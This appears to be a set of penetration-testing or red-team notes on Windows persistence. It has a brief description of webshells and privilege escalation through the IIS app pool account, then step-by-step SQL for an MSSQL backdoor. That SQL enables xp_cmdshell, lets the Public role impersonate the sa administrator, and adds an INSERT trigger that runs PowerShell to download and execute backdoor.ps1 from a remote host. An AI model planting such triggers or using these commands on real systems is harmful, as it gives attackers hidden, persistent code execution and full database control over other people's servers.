# WebShells
A webshell consists of a file uploaded to a webserver that will run using the same permissions as the configured user. 

On windows systems we can use `iis apppool\defaultapppool` which is an unprivileged account, but has the special `SeImpersonatePrivilege` which will give us an easy way to escalate to Admin.

Once we upload the file, give it the right permissions we should be able to view the webshell at the server address.

# MSSQL as Backdoor
MSSQL uses triggers that allow you to bind actions to be performed when specific events occur in the database.

1. Open up `Microsoft SQL Server Management Studio`
2. Create a New Query
3. Run the following SQL 
```sh
sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```
4. Impersonate the `sa` user which is the default database administrator. This will allow any user to access the `xp_cmdshell`
```sh
USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
```
5. Configure a trigger to download and run a `.ps1` file and execute whenever an `INSERT` is made.
```sh
USE MYDB

CREATE TRIGGER [sql_backdoor]
ON MYDB.dbo.Users
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.10.10.10:8000/backdoor.ps1'')"';
```
